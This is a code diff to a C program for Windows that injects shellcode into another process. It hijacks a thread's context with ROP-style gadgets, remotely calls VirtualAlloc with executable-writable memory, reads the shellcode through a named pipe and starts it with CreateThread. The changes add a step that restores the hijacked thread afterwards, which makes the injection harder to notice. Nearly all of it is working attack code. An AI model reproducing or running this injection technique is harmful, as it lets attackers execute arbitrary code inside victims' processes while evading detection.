@@ -99,22 +99,22 @@ DWORD64 PushData(HANDLE hThread, Gadgets gadgets, DWORD64 data) {
     return ctx.Rsp - 8;
 }
 
-//void push_junk(HANDLE hThread, Gadgets gadgets) {
-//
-//    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
-//    
-//    SuspendThread(hThread);
-//    GetThreadContext(hThread, &ctx);
-//
-//    ctx.Rdx = 0;
-//    ctx.Rip = gadgets.pshc;
-//    ctx.Rax = gadgets.jmps;
-//
-//    SetThreadContext(hThread, &ctx);
-//    ResumeThread(hThread);
-//    Sleep(2);
-//    SuspendThread(hThread);
-//}
+void PushJunk(HANDLE hThread, Gadgets gadgets) {
+
+    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
+    
+    SuspendThread(hThread);
+    GetThreadContext(hThread, &ctx);
+
+    ctx.Rdx = 0;
+    ctx.Rip = gadgets.pshc;
+    ctx.Rax = gadgets.jmps;
+
+    SetThreadContext(hThread, &ctx);
+    ResumeThread(hThread);
+    Sleep(2);
+    SuspendThread(hThread);
+}
 
 DWORD64 GetReturnValue(HANDLE hThread, Gadgets gadgets) {
     CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
@@ -211,17 +211,22 @@ int main(void) {
         return 1;
     }
 
-    const UINT32 HeapAllocSize = 0x2000;
+    //const UINT32 HeapAllocSize = 0x2000;
 
     // Set RIP to a `jmp $`, blocks when kernel exit
-    SuspendThread(hThread);
+
     CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
+    
+    SuspendThread(hThread);
     GetThreadContext(hThread, &ctx);
 
+    DWORD64 originalRip = ctx.Rip;
     ctx.Rip = gadgets.jmps;
 
     SetThreadContext(hThread, &ctx);
     ResumeThread(hThread);
+
+    ctx.Rip = originalRip;
 
     printf("[*] Primed thread, waiting for kernel exit...\n");
 
@@ -229,10 +234,10 @@ int main(void) {
     WaitUnblock(hThread);
     printf("[*] Process exited kernel, ready for injection\n");
 
-    // Push a junk val to stack, this is quite useless but it simplifies the code
-    // push_junk(hThread, gadgets);
+    // Push a junk val to stack, this is quite useless but it allows us to restore the orginal thread
+    PushJunk(hThread, gadgets);
 
-    HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, HeapAllocSize, 0, 5000, NULL);
+    HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, ArraySize(shellcode), 0, 5000, NULL);
     if (pipe == INVALID_HANDLE_VALUE) {
         printf("[!] CreateNamedPipeA failed with error code: %lu\n", GetLastError());
         return 1;
@@ -266,7 +271,7 @@ int main(void) {
     }
 
     // VirtualAlloc
-    DWORD64 addr = CallFuncRemote(hThread, gadgets, fnVirtualAlloc, TRUE, 4, (DWORD64[]) { 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE });
+    DWORD64 addr = CallFuncRemote(hThread, gadgets, fnVirtualAlloc, TRUE, 4, (DWORD64[]) { 0, ArraySize(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE });
     if (!addr) {
         printf("[*] VirtualAlloc Failed\n");
         return 1;
@@ -282,7 +287,7 @@ int main(void) {
     }
 
     // ReadFile
-    CallFuncRemote(hThread, gadgets, fnReadFile, FALSE, 5, (DWORD64[]) { phand, addr, HeapAllocSize, namptr, 0 });
+    CallFuncRemote(hThread, gadgets, fnReadFile, FALSE, 5, (DWORD64[]) { phand, addr, ArraySize(shellcode), namptr, 0 });
     printf("[*] ReadFile called\n");
 
     // CloseHandle
@@ -292,6 +297,11 @@ int main(void) {
     // CreateThread
     CallFuncRemote(hThread, gadgets, fnCreateThread, FALSE, 6, (DWORD64[]) { 0, 0, addr, 0, 0, 0 });
     printf("[*] CreateThread called\n");
+
+    printf("[*] Restoring original thread...\n");
+    SuspendThread(hThread);
+    SetThreadContext(hThread, &ctx);
+    ResumeThread(hThread);
 
     WaitForSingleObject(hThread, INFINITE);
     return 0;
